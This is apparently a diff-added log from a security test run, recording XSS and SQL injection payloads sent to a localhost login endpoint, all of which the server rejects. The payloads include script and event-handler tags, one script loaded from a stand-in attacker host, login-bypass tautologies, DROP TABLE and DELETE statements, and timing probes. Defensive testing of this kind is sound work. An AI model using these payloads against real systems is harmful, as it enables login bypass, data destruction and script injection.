+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <img src=x onerror=alert(1)>
+  [RESPONSE]
+    Status Code:          HTTP 400 (36 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.075] [PASS] Category: XSS Injection | Test: javascript:alert(1)
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = javascript:alert(1)
+  [RESPONSE]
+    Status Code:          HTTP 400 (41 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.100] [PASS] Category: XSS Injection | Test: <svg onload=alert(1)>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <svg onload=alert(1)>
+  [RESPONSE]
+    Status Code:          HTTP 400 (20 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.122] [PASS] Category: XSS Injection | Test: <body onload=alert('XSS')>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <body onload=alert('XSS')>
+  [RESPONSE]
+    Status Code:          HTTP 400 (16 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.145] [PASS] Category: XSS Injection | Test: "><script src=http://evil.com/x.js></script>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = "><script src=http://evil.com/x.js></script>
+  [RESPONSE]
+    Status Code:          HTTP 400 (15 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.206] [PASS] Category: XSS Injection | Test: <iframe src="javascript:alert(1)"></iframe>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <iframe src="javascript:alert(1)"></iframe>
+  [RESPONSE]
+    Status Code:          HTTP 400 (52 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.240] [PASS] Category: XSS Injection | Test: <input type="text" autofocus onfocus="alert(1)">
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <input type="text" autofocus onfocus="alert(1)">
+  [RESPONSE]
+    Status Code:          HTTP 400 (26 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.264] [PASS] Category: XSS Injection | Test: "><svg/onload=confirm(1)>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = "><svg/onload=confirm(1)>
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.289] [PASS] Category: XSS Injection | Test: ';alert(String.fromCharCode(88,83,83))//\
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ';alert(String.fromCharCode(88,83,83))//\
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.306] [PASS] Category: XSS Injection | Test: <a href="javascript:alert(1)">Click</a>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <a href="javascript:alert(1)">Click</a>
+  [RESPONSE]
+    Status Code:          HTTP 400 (12 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.382] [PASS] Category: XSS Injection | Test: bioId=<script>alert(1)</script>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = <script>alert(1)</script>
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (62 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.422] [PASS] Category: XSS Injection | Test: bioId=<img src=x onerror=alert(1)>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = <img src=x onerror=alert(1)>
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (33 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.455] [PASS] Category: SQL Injection | Test: bioId=1 OR 1=1
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1 OR 1=1
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (14 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.507] [PASS] Category: SQL Injection | Test: bioId=' OR '1'='1
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = ' OR '1'='1
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (37 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.531] [PASS] Category: SQL Injection | Test: bioId=1; DROP TABLE users;--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1; DROP TABLE users;--
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.570] [PASS] Category: SQL Injection | Test: bioId=1 UNION SELECT null, null--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1 UNION SELECT null, null--
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (29 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.601] [PASS] Category: SQL Injection | Test: bioId=1001' OR '1'='1
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001' OR '1'='1
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.639] [PASS] Category: SQL Injection | Test: ' OR '1'='1
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR '1'='1
+  [RESPONSE]
+    Status Code:          HTTP 400 (32 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.666] [PASS] Category: SQL Injection | Test: ' OR 1=1--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR 1=1--
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.694] [PASS] Category: SQL Injection | Test: admin' --
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = admin' --
+  [RESPONSE]
+    Status Code:          HTTP 400 (26 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.718] [PASS] Category: SQL Injection | Test: '; DROP TABLE users;--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = '; DROP TABLE users;--
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.740] [PASS] Category: SQL Injection | Test: '; DELETE FROM accounts;--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = '; DELETE FROM accounts;--
+  [RESPONSE]
+    Status Code:          HTTP 400 (18 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.770] [PASS] Category: SQL Injection | Test: ' UNION SELECT null, null, null--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' UNION SELECT null, null, null--
+  [RESPONSE]
+    Status Code:          HTTP 400 (28 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.793] [PASS] Category: SQL Injection | Test: 1' ORDER BY 1--+
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 1' ORDER BY 1--+
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.823] [PASS] Category: SQL Injection | Test: admin' /*
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = admin' /*
+  [RESPONSE]
+    Status Code:          HTTP 400 (28 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.854] [PASS] Category: SQL Injection | Test: ' OR 'x'='x
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR 'x'='x
+  [RESPONSE]
+    Status Code:          HTTP 400 (28 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.877] [PASS] Category: SQL Injection | Test: ") OR ("1"="1
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ") OR ("1"="1
+  [RESPONSE]
+    Status Code:          HTTP 400 (19 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.906] [PASS] Category: SQL Injection | Test: ' OR '' = '
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR '' = '
+  [RESPONSE]
+    Status Code:          HTTP 400 (27 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.927] [PASS] Category: SQL Injection | Test: '; WAITFOR DELAY '0:0:5'--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = '; WAITFOR DELAY '0:0:5'--
+  [RESPONSE]
+    Status Code:          HTTP 400 (18 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.949] [PASS] Category: SQL Injection | Test: ' OR SLEEP(5)--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR SLEEP(5)--
+  [RESPONSE]
+    Status Code:          HTTP 400 (19 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.970] [PASS] Category: SQL Injection | Test: '; pg_sleep(5)--
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = '; pg_sleep(5)--
+  [RESPONSE]
+    Status Code:          HTTP 400 (18 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.992] [PASS] Category: SQL Injection | Test: 1' OR '1' = '1' /*
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 1' OR '1' = '1' /*
+  [RESPONSE]
+    Status Code:          HTTP 400 (19 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:20.023] [PASS] Category: SQL Injection | Test: ' OR 1=1#
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ' OR 1=1#
+  [RESPONSE]
+    Status Code:          HTTP 400 (28 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:20.045] [PASS] Category: SQL Injection | Test: admin' or '1'='1'#
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = admin' or '1'='1'#
+  [RESPONSE]
+    Status Code:          HTTP 400 (19 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
